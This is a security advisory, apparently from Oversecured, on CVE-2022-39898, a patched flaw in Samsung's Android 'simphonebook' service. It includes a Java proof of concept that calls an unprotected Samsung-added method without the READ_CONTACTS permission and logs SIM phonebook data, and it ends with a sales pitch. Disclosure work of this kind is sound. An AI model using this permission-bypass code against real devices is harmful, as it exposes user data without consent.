# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/telephony-common.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.05</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39898">CVE-2022-39898</a> (SVE-2022-1886)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1180</td>
    </tr>
</table>

# Description

The `simphonebook` system service was created in AOSP but has been patched in the Samsung Android Framework. Samsung has extended the capabilities of this service and added, for example, the possibility to set likes on SIM contacts and to read SIM capabilities. All standard methods from this service require the `android.permission.READ_CONTACTS` permission, but the ones added by Samsung did not require any permissions.

**Proof of Concept**

```java
static final int TRANSACTION_getUsimPBCapaInfo = 12;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("simphonebook");
        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_getUsimPBCapaInfo, parcel, reply, 0);
        reply.readException();
        if (reply.readBoolean()) {
            Parcelable.Creator creator = (Parcelable.Creator) Class.forName("com.android.internal.telephony.uicc.UsimPhonebookCapaInfo")
                    .getField("CREATOR")
                    .get(null);
            Log.d("evil", "Reply: " + new Gson().toJson(creator.createFromParcel(reply)));
        } else {
            Log.d("evil", "Reply: null");
        }
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.